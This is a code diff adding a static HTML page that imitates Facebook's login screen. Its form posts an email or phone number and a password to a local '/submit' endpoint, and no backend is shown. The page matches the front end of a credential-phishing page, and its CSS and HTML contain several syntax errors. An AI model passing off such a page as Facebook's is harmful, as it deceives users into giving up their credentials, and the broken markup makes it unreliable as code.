@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+       body {
+    font-family: Arial, sans-serif;
+    background-image: url('https://wallpapers-max.b-cdn.net/wallpapers/2025/26oct/thumb/beautiful-clouds-over-a-gorgeous-sea-wallpaper.jpg');
+    background-size: cover;
+    background-position: center;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    color: rgb(42, 7, 243)
+    login-container {
+    background-color: #ffffff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+    width: 350px;
+}
+.input-group {
+    margin-bottom: 15px;
+}
+.input-group label {
+    display: block;
+    margin-bottom: 5px;
+    font-weight: bold;
+}
+.input-group input {
+    width: 100%;
+    padding: 10px;
+    border-radius: 4px;
+    border: 1px solid #ccc;
+    text-align: center;
+}
+.login-button {
+    width: 100%;
+    padding: 10px;
+    background-color: #42b72a;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    text-align: center;
+}
+.create-account-button {
+    width: 100%;
+    padding: 10px;
+    background-color: oklch(83.145% 0.2753 141.631);
+    color: white;
+    border: none;
+    border-radius: 4px;
+    text-align: center;
+}
+.forgot-password-link {
+    color: hsl(251, 96%, 48%);
+    display: block;
+    text-align: center;
+    margin-top: 10px;
+}
+        }
+    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <h1> Facebook</h1>
+        <p></p>Connect with friends and the world around you on Facebook.</p>
+        <form action="/submit" method="post">
+            <div class="input-group">
+                <label for="email">Email or Phone Number</label>
+                <input type="text" id="email" name="email" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="login-button">Log In</button>
+ <div class="or">or</div>
+            <button type="button" class="create-account-button">Create New Account</button>
+        </form>
+        <a href="#" class="forgot-password-link">Forgot Password?</a>
+    </div>
+    </body>
+    </center>
+</html>
